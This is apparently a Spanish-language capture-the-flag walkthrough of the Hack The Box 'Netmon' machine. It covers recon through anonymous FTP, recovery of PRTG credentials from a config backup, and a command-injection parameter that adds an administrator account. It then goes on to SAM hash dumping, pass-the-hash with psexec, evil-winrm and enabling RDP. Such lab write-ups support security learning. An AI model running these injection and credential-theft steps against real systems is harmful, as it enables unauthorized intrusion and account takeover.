## Summary

Tags: 
Y
- IP -> 10.10.10.152
- Ports -> TCP (21, 80, 135, 139, 445, 5985, 47001, 49664-9), UDP (idk)
- OS ->  Windows 
- Services & Applications
    - 21 -> ftp anonymous login allowed
    - 80 -> httpd 18.1.37.13946 (PRTG Network Monitor)
    - 135 -> msrpc
    - 139 -> netbios-ssn
    - 445 -> samba microsoft-ds Windows server 2008 R2 - 2012 microsoft-ds


## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon
- Comando -> **ftp 10.10.10.152** Ingresamos por FTP y ahi podemos encontrar la flag de user.txt
- Comando -> **crackmapexec smb {ip_targeted}** Para ver si podemos listar los servicios de Windows del puerto 445 y nos sale Netmon 
- Comando -> **smbclient -L** **{ip_targeted} -N** Lista recursos compartidos a nivel de red haciendo uso de un null sesion (sin credencial alguna)
- - Comando -> **whatweb http://< URL>**  Nos dara una breve descripcion del gestor de contenidos del puerto 80, pero en este caso nos marca un error, por lo que miramos la pagina web.

Buscamos que es PRTG network monitor y tambien sus default password. **admin and user = prtgadmin** pero no funcionan. por lo que seguiremos buscando en ftp.
- Comando -> **ftp 10.10.10.152** Ingresamos por FTP, por lo que trataremos de buscar el (**paessler RPTG bandwit monitor**),  y encontrar rutas que nos puedan dar credenciales en texto claro
Rutas tipicas son:
- >cd "**Program Files**" Pero no encotramos nada interesante

- >cd "**Program Files (x86)**" Nos movemos a ese dir dentro del ftp
- >cd "PRTG Network Monitor" Nos movemos a ese directorio 
- >cd 'webroot' Nos metemos en ese dir que encontramos pero no encontramos nada

ProgramData especifica la ruta de acceso a la carpeta program-data (C:\\ProgramData). A diferencia de la carpeta archivos de programa, las aplicaciones pueden usar esta carpeta para almacenar datos para los usuarios estandar, ya que no requiere permisos elevados.

- >cd "**ProgramData**" Nos metemos dentro del dir y encontramos Paessler que lo encontramos con el comando (ls -la) para archivos ocultos
- >cd Paessler Nos metemos dentro del dir para ver si encontramos algo
- >cd "PRTG Network Monitor" Ingresamos al dir y encontramos el siguiente archivo jugoso
- >get "PRTG Configuration.dat" Archivo que puede contener credenciales y no lo descargamos

- Comando -> **cat "PRTG Configuration.dat" | grep -i password -C 1 | less**  Buscaremos la palabra password ahi adentro sin importar que este con mayusculas o minusculas (i=insensitive, c=listar una linea) y con less lo miramos en formato pagina. Pero no encontramos nada.

- >get "PRTG Configuration.old.bak" Ahora nos descargamos este archivo que tiene pinta de un backupy podria tener credenciales y nos lo descargamos
- Comando -> **diff "PRTG Configuration.dat" "PRTG Configuration.old.bak" | less**  Buscaremos la diferencia entres esos dos archivos, por lo que llegamos a encontrar un user=prtgadmin y password=PrTg@dmin2018

Ahora podemos acceder en la pagina web con esas credenciales obtenidas, pero nos marca error, por lo que si nos poenmos a pensar la encontramos en un archivo old, por lo que le aumentaremos a 2019 para ver si podemos entrar y lo logramos.

Buscamos en Google (PRTG Network Monitor command injection) Y nos dice que a traves de las notificaciones de la pagina web nosotros podemos ingresar un comando. Cuando creamos una y en la parte de "ejecute Program"
	Program File: **.ps1**
	Parameter: **test.txt;net user omar Omar123#! /add; net localgroup Administrators omar /add** 

Con eso vamos a poder agregar un usaurio que pretenezca al grupo Administrator
Despues le damos save. 

Para nosotros poder activar la notificacion que acabamos de crear le damos a la casilla y despues le damos a send test notification. 

- Comando -> **crackmapexec smb {ip_targeted} -u {‘user’} -p {‘password’}** Con este comando verificamos que exista el usuario que hemos colocado en la pagina web y si es asi nos pondra un [+] Pwn3d!.

## User

## Root
Cuando tengamos credenciales validas en el crackmapexec, podemos usar este servicio para conectarnos.
- Comando -> **evil-winrm -i {ip_targeted} -u {‘user’} -p {‘password’}** Con este comando nos conecta al servicio del servidor de winrm y de ahi podemos visualizar la flag root.txt final


--
Alternativo:
- Comando -> **crackmapexec smb {ip_targeted} -u {‘user’} -p {‘password’} --sam** Podremos listar el hash del usuario administrador y del resto que existan en el sistema, con los que podemos llegar a aplicar pass de hash  
- Comando -> **crackmapexec smb {ip_targeted} -u {‘user’} -H {‘hash’}** Con este comando verificamos que el usuario y su hash son validos y si es asi nos pondra un [+] Pwn3d!. 
- Comando -> **psexec.py WORKGROUP/Administrator@10.10.10.152 -hashes 's25df1s6fse86'** Podremos ganar acceso al sistema y nos lanzara una cmd ya que estariamos haciendo un Pass de Hash 

- Comando -> **crackmapexec smb < IP TARGET> -u <‘USER’> -H <‘HASH’> -M rdp -o action=enable** Podemos habilitar el RDP puerto 3389 
- Comando -> **remmina** Para podernos conectar a la maquina victima por RDP de forma grafica
	Ahi adentro le colocamos la IP
	Nombre, Password
	Dominio: WORKGROUP o netmon
	Aceptar 
Y nos debe de conectar al RDP